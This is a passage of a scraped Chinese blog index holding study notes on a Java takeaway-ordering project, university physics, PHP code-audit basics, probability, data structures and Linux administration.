return new ServerEndpointExporter(); } } Impl 里引用 1 2 3 4 5 6 7 8 orderMapper.update(orders); Map map = new HashMap(); map.put(\u0026#34;type\u0026#34;, 1);//消息类型，1表示来单提醒 map.put(\u0026#34;orderId\u0026#34;, orders.getId()); map.put(\u0026#34;content\u0026#34;, \u0026#34;订单号：\u0026#34; + outTradeNo); //通过WebSocket实现来单提醒，向客户端浏览器推送消息 webSocketServer.sendToAllClient(JSON.toJSONString(map)); 催单 类似\nWebSocket 不知道为什么连不上……\nApache Echarts、数据统计 Apache ECharts 是一款基于 Javascript 的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。\n营业额统计 **注意：**具体返回数据一般由前端来决定，前端展示图表，具体折现图对应数据是什么格式，是有固定的要求的。\nController 注意：@DateTimeFormat(pattern = \u0026quot;yyyy-MM-dd\u0026quot;) 指定格式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package com.sky.controller.admin; /** * 报表 */ @RestController @RequestMapping(\u0026#34;/admin/report\u0026#34;) @Slf4j @Api(tags = \u0026#34;统计报表相关接口\u0026#34;) public class ReportController { @Autowired private ReportService reportService; /** * 营业额数据统计 */ @GetMapping(\u0026#34;/turnoverStatistics\u0026#34;) @ApiOperation(\u0026#34;营业额数据统计\u0026#34;) public Result\u0026lt;TurnoverReportVO\u0026gt; turnoverStatistics( @DateTimeFormat(pattern = \u0026#34;yyyy-MM-dd\u0026#34;) LocalDate begin, @DateTimeFormat(pattern = \u0026#34;yyyy-MM-dd\u0026#34;) LocalDate end) { return Result.success(reportService.getTurnover(begin, end)); } } Service 用 map 来传递参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.sky.service.impl; @Service @Slf4j public class ReportServiceImpl implements ReportService { @Autowired private OrderMapper orderMapper; /** * 根据时间区间统计营业额 * @param begin * @param end * @return */ public TurnoverReportVO getTurnover(LocalDate begin, LocalDate end) { List\u0026lt;LocalDate\u0026gt; dateList = new ArrayList\u0026lt;\u0026gt;(); dateList.add(begin); while (!begin.equals(end)){ begin = begin.plusDays(1);//日期计算，获得指定日期后1天的日期 dateList.add(begin); } List\u0026lt;Double\u0026gt; turnoverList = new ArrayList\u0026lt;\u0026gt;(); for (LocalDate date : dateList) { LocalDateTime beginTime = LocalDateTime.of(date, LocalTime.MIN); LocalDateTime endTime = LocalDateTime.of(date, LocalTime.MAX); Map map = new HashMap(); map.put(\u0026#34;status\u0026#34;, Orders.COMPLETED); map.put(\u0026#34;begin\u0026#34;,beginTime); map.put(\u0026#34;end\u0026#34;, endTime); Double turnover = orderMapper.sumByMap(map); turnover = turnover == null ? 0.0 : turnover; turnoverList.add(turnover); } //数据封装 return TurnoverReportVO.builder() .dateList(StringUtils.join(dateList,\u0026#34;,\u0026#34;)) .turnoverList(StringUtils.join(turnoverList,\u0026#34;,\u0026#34;)) .build(); } } Mapper 接收 map 直接取就可以 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;select id=\u0026#34;sumByMap\u0026#34; resultType=\u0026#34;java.lang.Double\u0026#34;\u0026gt; select sum(amount) from orders \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt; and status = #{status} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and order_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and order_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 用户统计 Service 自定义方法来计算总数 返回的是字符串，还要进行处理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 @Override public UserReportVO getUserStatistics(LocalDate begin, LocalDate end) { List\u0026lt;LocalDate\u0026gt; dateList = new ArrayList\u0026lt;\u0026gt;(); dateList.add(begin); while (!begin.equals(end)){ begin = begin.plusDays(1); dateList.add(begin); } List\u0026lt;Integer\u0026gt; newUserList = new ArrayList\u0026lt;\u0026gt;(); //新增用户数 List\u0026lt;Integer\u0026gt; totalUserList = new ArrayList\u0026lt;\u0026gt;(); //总用户数 for (LocalDate date : dateList) { LocalDateTime beginTime = LocalDateTime.of(date, LocalTime.MIN); LocalDateTime endTime = LocalDateTime.of(date, LocalTime.MAX); //新增用户数量 select count(id) from user where create_time \u0026gt; ? and create_time \u0026lt; ? Integer newUser = getUserCount(beginTime, endTime); //总用户数量 select count(id) from user where create_time \u0026lt; ? Integer totalUser = getUserCount(null, endTime); newUserList.add(newUser); totalUserList.add(totalUser); } return UserReportVO.builder() .dateList(StringUtils.join(dateList,\u0026#34;,\u0026#34;)) .newUserList(StringUtils.join(newUserList,\u0026#34;,\u0026#34;)) .totalUserList(StringUtils.join(totalUserList,\u0026#34;,\u0026#34;)) .build(); } /** * 根据时间区间统计用户数量 * @param beginTime * @param endTime * @return */ private Integer getUserCount(LocalDateTime beginTime, LocalDateTime endTime) { Map map = new HashMap(); map.put(\u0026#34;begin\u0026#34;,beginTime); map.put(\u0026#34;end\u0026#34;, endTime); return userMapper.countByMap(map); } Mapper 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;select id=\u0026#34;countByMap\u0026#34; resultType=\u0026#34;java.lang.Integer\u0026#34;\u0026gt; select count(id) from user \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and create_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and create_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 订单统计 类似\n销量排行榜 Mapper 只返回前十条数据即可，用 limit 限制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;select id=\u0026#34;getSalesTop10\u0026#34; resultType=\u0026#34;com.sky.dto.GoodsSalesDTO\u0026#34;\u0026gt; select od.name name,sum(od.number) number from order_detail od ,orders o where od.order_id = o.id and o.status = 5 \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and order_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and order_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; group by name order by number desc limit 0, 10 \u0026lt;/select\u0026gt; Apache POI Apache POI 是一个处理Miscrosoft Office各种文件格式的开源项目。简单来说就是，我们可以使用 POI 在 Java 程序中对Miscrosoft Office各种文件进行读写操作。 一般情况下，POI 都是用于操作 Excel 文件。\n坐标 1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.16\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.16\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 数据处理演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package com.sky.test; import org.apache.poi.xssf.usermodel.XSSFCell; import org.apache.poi.xssf.usermodel.XSSFRow; import org.apache.poi.xssf.usermodel.XSSFSheet; import org.apache.poi.xssf.usermodel.XSSFWorkbook; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class POITest { /** * 基于POI向Excel文件写入数据 * @throws Exception */ public static void write() throws Exception{ //在内存中创建一个Excel文件对象 XSSFWorkbook excel = new XSSFWorkbook(); //创建Sheet页 XSSFSheet sheet = excel.createSheet(\u0026#34;itcast\u0026#34;); //在Sheet页中创建行，0表示第1行 XSSFRow row1 = sheet.createRow(0); //创建单元格并在单元格中设置值，单元格编号也是从0开始，1表示第2个单元格 row1.createCell(1).setCellValue(\u0026#34;姓名\u0026#34;); row1.createCell(2).setCellValue(\u0026#34;城市\u0026#34;); XSSFRow row2 = sheet.createRow(1); row2.createCell(1).setCellValue(\u0026#34;张三\u0026#34;); row2.createCell(2).setCellValue(\u0026#34;北京\u0026#34;); XSSFRow row3 = sheet.createRow(2); row3.createCell(1).setCellValue(\u0026#34;李四\u0026#34;); row3.createCell(2).setCellValue(\u0026#34;上海\u0026#34;); FileOutputStream out = new FileOutputStream(new File(\u0026#34;D:\\\\itcast.xlsx\u0026#34;)); //通过输出流将内存中的Excel文件写入到磁盘上 excel.write(out); //关闭资源 out.flush(); out.close(); excel.close(); } public static void main(String[] args) throws Exception { write(); } } 数据读取演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package com.sky.test; import org.apache.poi.xssf.usermodel.XSSFCell; import org.apache.poi.xssf.usermodel.XSSFRow; import org.apache.poi.xssf.usermodel.XSSFSheet; import org.apache.poi.xssf.usermodel.XSSFWorkbook; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class POITest { /** * 基于POI读取Excel文件 * @throws Exception */ public static void read() throws Exception{ FileInputStream in = new FileInputStream(new File(\u0026#34;D:\\\\itcast.xlsx\u0026#34;)); //通过输入流读取指定的Excel文件 XSSFWorkbook excel = new XSSFWorkbook(in); //获取Excel文件的第1个Sheet页 XSSFSheet sheet = excel.getSheetAt(0); //获取Sheet页中的最后一行的行号 int lastRowNum = sheet.getLastRowNum(); for (int i = 0; i \u0026lt;= lastRowNum; i++) { //获取Sheet页中的行 XSSFRow titleRow = sheet.getRow(i); //获取行的第2个单元格 XSSFCell cell1 = titleRow.getCell(1); //获取单元格中的文本内容 String cellValue1 = cell1.getStringCellValue(); //获取行的第3个单元格 XSSFCell cell2 = titleRow.getCell(2); //获取单元格中的文本内容 String cellValue2 = cell2.getStringCellValue(); System.out.println(cellValue1 + \u0026#34; \u0026#34; +cellValue2); } //关闭资源 in.close(); excel.close(); } public static void main(String[] args) throws Exception { read(); } } 后续代码类似，要用到的时候再学吧，完结。\n","date":"2025-10-23T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E8%8B%8D%E7%A9%B9%E5%A4%96%E5%8D%96/","title":"苍穹外卖"},{"content":"参考视频：《大学物理-电磁学》\n电学 电场强度 库伦定律： 电场强度： 对于圆弧来说：dl = Rdθ\n一些结论： 电通量、高斯定理 电通量 静电场中高斯定理 电势 电势 电势能 电场和电势的关系 导体 为什么内部场强为零？ 导体上的电荷可以自由移动，移动后形成电场，与外部场强相抵消\n内部包围有电荷 q 时，导体上电荷分布？ 导体内层会感应出 -q，外层变为 Q+q。由高斯定理配合导体内场强为零，可知导体内部的 E * S = 0，故 q + -q = 0\n传导电流 若将导体的两端接到电源上, 导体中便有持续的电流，这种存在导体中的电流称为传导电流。\n电流密度 欧姆定律的微分形式 稳恒电流 可推导出基尔霍夫定律 电动势 电容器 串并联 串联时电荷相等 并联时电压相等 C = C1 + …… + Cn 特例：\n电解质、电场能 电介质高斯定理 电场能 磁学 磁感应强度 判断方向 毕奥萨法尔定律 结论：\n安培环路定理： 磁通量、高斯定理 分类：\n安培力、磁矩、洛伦兹力 安培力 磁矩 洛伦兹力 磁介质、磁场能 磁介质 磁场能量 ","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/","title":"大学物理（下）"},{"content":"参考：代码审计-PHP篇\n原生开发 关键词挖掘 功能挖掘 SQL 注入 正则搜索 (update|select|insert|delete|).*?where.*= 需要搭配经验筛选，模板比较不容易出漏洞 看文件路径，后台漏洞不容易利用 找可执行变量、过滤，跟踪函数声明、用例 MySQL Monitor Client 跟踪项目 文件安全 发现\n脚本文件名 upload del delfile down downfile read readfile 应用功能点 下载、上传、读取…… \u0026ndash;\u0026gt; 抓包找路径 操作关键字 $_FILES、move_uploaded_file、unlink 遇见代码加密\n需要查找对应解密方法 模型开发 MVC ：Model、Controller、View\nMVC 对审计的影响\n文件代码定位：功能被封装，不好搜索 代码过滤分析 前端安全发现 版本对比的漏洞发现\n新版本修复，反推旧版本漏洞；根据旧版本漏洞看是否修复 Beyond、UltraCompare 项目 动态调试 phpstorm + phpstudy + xdebug 鉴权漏洞 未引用的鉴权逻辑 错误逻辑：先功能操作后鉴权 脆弱的、不严谨的 没有引用鉴权模块的，可以直接进入 ","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php/","title":"代码审计-PHP"},{"content":"参考视频：概率论四小时速成\n随机事件与概率 事件关系与运算率 事件关系：\n运算律：\n概率计算性质 注意：对于多项依然成立 集合并 == 概率 +\n集合且 == 概率 ·\n补充：容斥原理\n条件概率 条件概率与乘法公式：\n事件的独立性 独立不互斥，互斥不独立\n多事件独立性：\n全概率 - 贝叶斯公式：\n随机变量分布 分布函数： 备注：\n概率 - 分布函数关系：配凑出范围\n分布函数的充要条件： 等号跟大于走，永远右连续\n根据规范性、右连续性，可以用极限解方程求参数\n常识结论： 离散型随机变量 分布律可以写成表格的形式\n古典概型： 根据分布律写分布函数： 根据定义域划分范围，依次求和 二项分布 独立重复、事件 A 发生的次数\n几何概型： 几何分布 事件首次发生的概率\n二项 01 分布 泊松分布 注意一个代换：\n连续型随机变量 概率密度： 概率为 0 的事件可能发生\n概率密度的积分就成为概率 \u0026ndash;\u0026gt; 在哪求概率，就在哪求积分\n充要条件：\n与分布函数： 分定义域求积分\n均匀分布 指数分布 利用指数分布的无记忆性，转换区间\n正态分布 标准化： 先变换为标准正态，再求概率（用标准正态的分布函数表示）\n根据形式配凑\n已知 X，求 f(X) 的分布函数 关键在于根据 Y \u0026lt;= y 转换出 X ~ y 关系，用 X 的分布函数代换出 Y 的\n二维随机变量 离散型 联合分布律 独立性 有 p_ij = 0，一定不独立\n独立 == 各行（列）成比例\n连续型 分布密度、概率 找区域，二重积分即可\n独立性 边缘密度 对另一个变量积分\n条件概率密度 固定某个参数后，概率密度只域另一个参数有关\n二位均匀 求面积之比即可\n最大、最小值分布 二维连续型函数分布 分布函数法：\n换元 做正概区域范围 D_z 和 g(x,y) 观察交集 根据 z 从负无穷到正无穷，对 x，y 积分（z 作为常数） 公式法：\n需要可以反解出 y 才可使用，替换 x 或 y 以后，再乘上偏导\n注意定义域的选定\n","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%A6%82%E7%8E%87%E8%AE%BA/","title":"概率论"},{"content":"绪论 数据结构 形式定义：\n数据结构是一个四元组 Data_Structure=（D,L,S,O） D是数据元素的有限集 L是D上客观存在的关系（逻辑结构） S是关系L在计算机中的存储表示（存储结构） O是D上规定的一组操作。 组成：\n集合（set）—若干具有共同特征的事物的“聚合”。\n数据（data) —所有能输入到计算机中的描述客观事物的符号\n数据元素（data element）—数据的基本单位，也称节点（node）或记录（record）\n数据项（data item）—有独立含义的数据最小单位，也称域(field)\n关键码（key）—数据元素中能起标识作用的数据项。\n关系 —集合中元素之间的某种相关性\n逻辑结构\n线性结构：一对一，线性表、栈、队列等 树形结构 图状结构 存储结构\n顺序：借助相对位置表示元素间关系 链式：借助指针 散列：通过对关键字直接计算 算法 为了解决某类问题而规定的一个有限长的操作序列\n特性：有穷、确定、可行、功能性\n目标：正确、可读、健壮、高效率与低存储量需求\n衡量方法\n算法的时间特性用执行基本操作次数来度量 算法的空间特性用算法运行所需存储量的增长率 线性表、栈与队列 线性结构特点：在数据元素的非空有限集中 存在唯一一个称作“第一个”的数据元素 存在唯一一个称作“最后一个”的数据元素 除第一个外，集合中的每个数据元素均只有一个前驱 除最后一个外，集合中的每个数据元素均只有一个后继 线性表 定义：一个线性表是n个数据元素的有限序列 元素个数n = 表长度 a_1 无直接前驱，a_n 无直接后继 i 为 a_i 再线性表中的位序 顺序存储 逻辑上相邻 - 物理地址相邻\n操作\n插入：复杂度 n/2，算在 i 出的平均移动次数\n删除：复杂度 (n-1)/2\n优点：\n逻辑相邻，物理相邻 可随机存取任一元素 存储空间使用紧凑 缺点：\n插入、删除操作需要移动大量的元素 预先分配空间需按最大空间分配，利用不充分 表容量难以扩充 链式存储 特点： 用一组任意的存储单元存储线性表的数据元素，利用指针实现：用不相邻的存储单元存放逻辑上相邻的元素 每个数据元素ai，除存储本身信息外，还需存储其直接后继的信息 单链表 结构：\n1 2 3 4 5 6 7 8 9 typedef struct ListNode { ElemType data; struct ListNode *next; }ListNode,*ListNodePtr; // 生成新节点 p=(ListNodePtr) malloc ( sizeof ( ListNode )); // 回收节点 free(p) 操作\n查找：O(n) 插入、删除：O(1) 特点：\n动态结构，整个存储空间为多个链表共用\n不需预先分配空间，指针额外存储空间\n不能随机读取，查找慢\n循环链表 表中最后一个结点的指针指向头结点，使链表构成环状\n从表中任一结点出发均可找到表中其他结点， 提高查找效率\n操作与单链表基本一致,循环条件不同： 单链表 p 或 p-\u0026gt;next=NULL 循环链表 p-\u0026gt;next=h 双向链表 解决单链表单向性的问题，存储前、后指针\n栈 顺序存储 定义： 限定仅在表尾进行插入或删除操作的线性表，进行操作的一端称栈顶，固定的一端称栈底，不含元素的空表称空栈。 先进后出 操作： 用指针 top 始终指向栈顶，初值为 -1 （栈空），终值为 M-1 （栈满） 1 2 3 4 5 6 // 初始化 #define MAXSTACK 100 typedef struct{ int top; StackEntry entry[MAXSTACK]; }SqStack; 链式存储 top 始终指向下一个插入的位置，类似\n队列 限定只能在表的一端进行插入，在表的另一端进行删除的线性表，先进先出\n链式存储 设队首、队尾指针 front 和rear, front 指向头结点，rear 指向队尾\n问题：\n队列不满时假溢出、队列满时真溢出 解决：\n队首固定：需要频繁移动 X 循环队列：将队列设计成环形，让 让sq[0] 接在 sq[M-1] 之后，若 rear == M，则令 rear = 0 问题：队空和队满标志一样 解决：另设标志位、少用一个元素空间、用一个计数变量 优先队列 不完全遵守先进先出，设有优先级\n数组 顺序存储： 需要区分列主序、行主序\nLoc (j1, j2, ... , jn )=Loc (0, 0, ... , 0)+(b2*b3*...*bn*j1 + b3*b4*...*bn*j2+ ...+bn*jn-1+ jn)*l\n三角矩阵：\n三对角矩阵：\n稀疏矩阵：\n链式存储 表示矩阵：\n数组 + 链表\n查找、排序、递归 递归 定义：\n一个过程或函数出现调用本过程或本函数的成分,称之为递归。 若调用自身,称之为直接递归。若过程或函数p调用过程或函数q,而q又调用 p,称之为间接递归。 如果一个递归过程或递归函数中递归调用语句是最后一条执行语句,则称这种递归调用为尾递归。 查找 顺序表 顺序查找，改变 R[0] 以控制结束： 1 2 3 4 5 int seqsearch(DataType R[], KeyType key){ R[0].key=key, i=n; while (R[i].key != key) i=i-1; return i; } 折半查找，对于有序表 1 2 3 4 5 6 7 8 9 10 11 12 13 int BinarySearch(DataType SL[], KeyType key, int n){ //在长度为n的有序表SL中折半查找其关键字等于key的数据元素 //查找成功返回其在有序表中的位置，查找失败否返回0 int low=1; int high=n; while(low\u0026lt;=high){ mid=(low+high)/2; if(key = = SL[mid].key) {return mid;} else if( key\u0026gt;SL[mid].key) low=mid+1; else high=mid-1; } return 0; } 索引表查找 基本思想：将原表分成若干块，各块内部不一定有序，但表中的块是“分块有序”的，抽取各块中的最大关键字及其起始位置建立索引表。 块间顺序：复杂度 1/2 * (n/s + s) + 1 (n 长度，分成 n/s 块) 块间二分：log_2(n/s + 1) + s/2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int IndexSequelSearch(IndexType ls[], DataType s[], int m, int l, KeyType key){ //索引表中顺序查找关键字为key的记录。索引表为ls[0]-ls[m-1] //顺序表为s，块长为l //在索引表中顺序查找 i=0; while(i\u0026lt;m \u0026amp;\u0026amp; key\u0026gt;ls [i ].key)i++; //块间查找 if(i\u0026gt;=m)return -1; //查找失败 else{ //在块内顺序查找 j=ls[ i ].Link; while(Key!=s[j].key \u0026amp;\u0026amp; j-ls[ i ].Link\u0026lt;l)j++; if(key = = s[j].key)return j; //查找成功 else return -1; //查找失败 } } 哈希表查找 以 h(key) 哈希函数 作为 key 的记录在表中的位置，常见构造方法有： 直接哈希：适用于地址集合大小 == 关键字集合大小 数字分析：取随机 平方取中：取关键字平方后的中间几位 折叠：关键字分割后求和 除留取余：除某个不大于哈希表长度的数后取余 随机数：取随机数 冲突处理方法： 开放地址：线性探测、平方探测、随机探测 再散列 再哈希：将 n 个不同哈希函数排成序列，往下计算 链地址：将关键字发生冲突的记录存储在一个线性链表中 公共溢出：将发生冲突的放在冲突表中 ALS 影响因素： 选用的哈希函数 冲突处理方法 哈希表饱和度、装载因子 n/m 的大小 排序 基本概念 稳定性：对于任意的数据元素序列，以在排序前后相同关键字数据的相对位置是否改变为依据\n内外部：\n无需借助外存，称内部排序 数据量巨大，需要借助外村，称外部排序 插入 直接插入： 1 2 3 4 5 for ( i=2; i\u0026lt;=n; ++i ) if (R[i].key\u0026lt;R[i-1].key) { 在 R[1..i-1]中查找R[i]的插入位置; 插入R[i] ; } 折半插入\n因为 R[1..i-1] 是一个按关键字有序的有序序列，则可以利用折半查找实现 希尔排序\n对于n较大而且无序时，直接插入排序效率就较低，这时，如果能将序列分成几个较小的序列，对这些较小的序列先排序，然后再对较长的序列进行排序，可一定程度地提高排序效率。 步骤： 先选取一个小于n的整数di（步长），然后把待排序的序列分成di个组 第一趟完成之后，减小步长，再进行分组，再排序，如此知道 d=1 交换 冒泡排序 基于两两比较及交换，直到某一趟没有发生数据的交换为止。 改进：记下上次交换的位置 1 2 3 4 5 6 7 8 9 10 11 12 13 void Bubble_Sort(DataType R[], int n){ //对长度为n的序列R按升序进行冒泡排序，降序排序类似 for(i=1; i\u0026lt;n; ++i){ swap=0; //交换标志 for(j=1; j\u0026lt;=n-i; ++j){ // 可以改进成 j\u0026lt;i if(R[j].key\u0026gt;R[j+1].key){ 不满足升序规则，交换 R[0]=R[j+1]; R[j+1]=R[j]; R[j]=R[0]; swap=1; } if(swap==0) break; //此趟冒泡没有发生交换，排序结束 } } } ","date":"2025-10-22T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251022104404297.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"数据结构与算法"},{"content":"Linux 入门 御林招新题：DevOps-Linux入门\n一、环境搭建 完成centos7版本Linux系统的服务器与云服务器部署，通过终端工具远程连接操作。\n二、命令基础 口令修改：passwd命令修改用户密码。 基础命令：ls（查看目录）、mkdir（创建目录）、cd（切换目录）。 cd -：切换到上次所在目录\n帮助查询：man 命令名获取命令详细帮助，如man ls。 三、文件与目录操作 定位切换：pwd显示当前目录，cd切换目录。 查看操作：ls搭配-l（详细属性）、-lh（人性化大小）、-t（时间排序）、-a（隐藏文件）等选项。 目录管理：mkdir创建、rmdir删除空目录。 文件操作：touch创建空文件；cp（复制）、mv（移动/重命名）、ln（硬链接）、ln -s（软链接）、rm（删除）。 内容查看：cat命令查看文件内容（不可查看目录）。 Q1: 如何实时查看一个正在增长的日志文件？\ntail -f file Q2: 如果日志文件被logrotate归档（重命名）了，tail -f会怎样？如何保证持续跟踪？\ntail -f 会停止输出 (因为它跟踪的是inode)。应该用 tail -F，它会检测文件名变化并重新打开文件。 grep\n-r 递归查找，-l 只列出文件名 watch [选项] 命令\n-n 秒数：指定执行命令的间隔时间（默认 2 秒）。\n-d：高亮显示两次输出之间的差异（方便观察变化部分）。\n-t：不显示顶部的标题栏（包含执行时间、命令等信息）。\n四、文件和目录权限 权限解读：10位权限字符串，第1位为文件类型，2-4位所有者权限，5-7位所属组权限，8-10位其他用户权限；r=4、w=2、x=1、-=0。 权限修改：chmod [用户][操作][权限] 文件名，用户含u/g/o/a，操作含+/-/=。 五、vi编辑器 基础操作：vi 文件名创建文件；:wq保存退出，:q!强制退出。 光标移动：k/j/h/l上下左右，w/b单词间移动，^/$行首尾，gg/G文首尾。 文本编辑：i/I/a/A/o/O进入插入模式；nx（删n字符）、ndd（删n行）删除内容；r/R修改内容。 进阶功能：:set number显示行号；:!command执行系统命令；:%s/old/new/g全局替换；/pattern查找内容。 复制撤销：nyy复制n行、p粘贴；u撤销、ctrl+r重做。 六、文件操作进阶 通配符：ls a*查找指定目录下以a开头的文件。 文件查找：find 目录 -type f [-name] -printf \u0026quot;%f\\n\u0026quot;查找文件并显示文件名。 内容排序：sort（正序）、sort -r（逆序）排序文件内容。 部分显示：head -n 数字（前n行）、tail -n 数字（后n行）。 sed 流编辑器 sed [选项] '编辑命令' 文件 sed 's/old/new/g' file：替换所有行中的 old 为 new（s 是替换操作） awk '模式 { 动作 }' 文件 用于信息统计 七、文件权限进阶 链接区别：软链接适用于跨分区/目录快捷方式；硬链接适用于同一分区文件共享，源文件删除仍可用。 硬链接: 共享同一个inode，本质是同一个文件。删除一个不影响另一个，直到inode引用计数为0。不能跨文件系统，不能链接目录(防止创建循环引用，导致遍历混乱)。\n软链接: 一个独立文件，内容是它所指向文件的路径。类似快捷方式。\n权限恢复：chmod u=rwx,g=rx,o=rx 目录名或chmod 755 目录名恢复默认权限。 ls -l 输出格式是？ 第一位是文件类型 d: 目录, -: 文件, l: 链接 所有者读写执行-组用户读执行-其他用户读执行 如何递归添加权限？ chmod -R a+r mydir 什么是 SUID, SGID 和 Sticky Bit (粘滞位)？ SUID：当普通用户执行带有 SUID 权限的可执行文件时，该进程的有效用户 ID（UID）会临时变为文件所有者的 UID。 chmod 4755 test.sh SGID：用于文件类似SUID；用于目录则在此目录中创建的新文件，其所属组会自动继承目录的所属组。 chmod 2775 /opt/project StickyBit：只有目录所有者、文件所有者或root才能删除目录中的文件 chmod 1777 /tmp 如何查看一个用户的UID, GID 和他属于的所有组？ id name 如何把用户 www-data 添加到 docker 组，并且不覆盖他已有的组？ usermod -aG docker www-data (-a 代表 append 追加) Linux 进阶 御林招新题：Linux 进阶\n一、系统与进程管理 特殊进程：PID为1的是init进程，是系统首个用户空间进程，作为所有进程的祖先，负责系统初始化、服务启动、运行级别设置及系统关闭收尾工作。 进程查看：ps -A -f查看所有活跃进程，通过PID（进程ID）和PPID（父进程ID）分析父子关系。 端口与进程处理：用lsof或netstat（搭配-t/-u/-l/-p/-n等选项）查找占用指定端口的进程PID；通过kill -pid PID强制终止进程。 一个应用服务器突然响应很慢，你的排查思路是什么？ top/htop 看CPU/内存占用和Load Avg。 free -m / vmstat 看内存/Swap。 iostat -x / iotop 看磁盘I/O。 ss -tnp / netstat 看网络连接数。 dmesg -T 看内核/硬件有无报错。 如何查看某个进程打开了哪些文件？ lsof -p \u0026lt;PID\u0026gt;。或者进入 /proc/\u0026lt;PID\u0026gt;/fd/ 目录查看。 二、网络与文件系统 文件系统结构：采用树形结构，/为根目录，包含系统核心文件和目录，普通用户多为只读权限；/home是普通用户主目录集合，用户拥有完全操作权限。关键子目录功能： /bin：存放普通用户和超级用户均可执行的基本命令。 /sbin：存放仅超级用户可执行的系统管理命令。 /etc：存储系统各类配置文件。 /dev：存放硬件设备抽象文件。 /proc：虚拟文件系统，反映系统运行状态。 /usr：存放用户安装的应用程序及文件。 /var：存放日志、邮件等动态变化文件。 /tmp：存放临时文件，系统重启后清空。 GRUB：统一引导加载程序，负责系统启动时加载Linux内核并移交控制权，支持多系统启动选择和内核参数临时修改。 Nginx 相较 Apache 有什么优势？\nNginx：事件驱动 (Event-driven), 异步非阻塞 (Asynchronous)。内存占用少，高并发能力强，非常适合做反向代理和静态文件服务。 Apache：传统进程/线程模型 (prefork/worker)。功能模块丰富 (如 .htaccess)，但在高并发下资源消耗大。 Nginx 如何实现负载均衡？\nupstream backend { server 1.1.1.1; server 1.1.1.2; }\n1 2 3 4 5 server { listen 80; server_name your-domain.com; location / { proxy_pass http://localhost:3000; proxy_set_header Host $host; } } 三、文件内容处理 模式查找：grep '^t' /etc/passwd查找/etc/passwd中以t开头的文本行。 管道与重定向：grep -E [0-9] /etc/passwd | wc -l \u0026gt; hello/digit_count.txt，统计文件中含数字的行数并将结果重定向到指定文件。 四、高级系统管理 systemd服务： 编写.sh脚本实现每分钟向指定日志文件写入当前时间。 配置service文件，通过systemctl enable启用开机自启、systemctl start启动服务，systemctl status查看服务状态。 内核模块：lsmod列出已加载内核模块；modprobe 模块名加载模块，modprobe -r 模块名卸载模块。如dummy虚拟网络设备模块，可用于网络测试、服务绑定隔离等场景。 你修改了一个 sshd.service 的 .service 配置文件 (e.g. 更改了启动参数)，为什么 systemctl restart sshd 后不生效？ 修改 systemd 的单元(unit)文件后，必须先执行 systemctl daemon-reload 来重载配置，然后再 restart 服务。 systemctl reload nginx 和 systemctl restart nginx 有什么区别？ restart: \u0026ldquo;先停后启\u0026rdquo;。 reload: 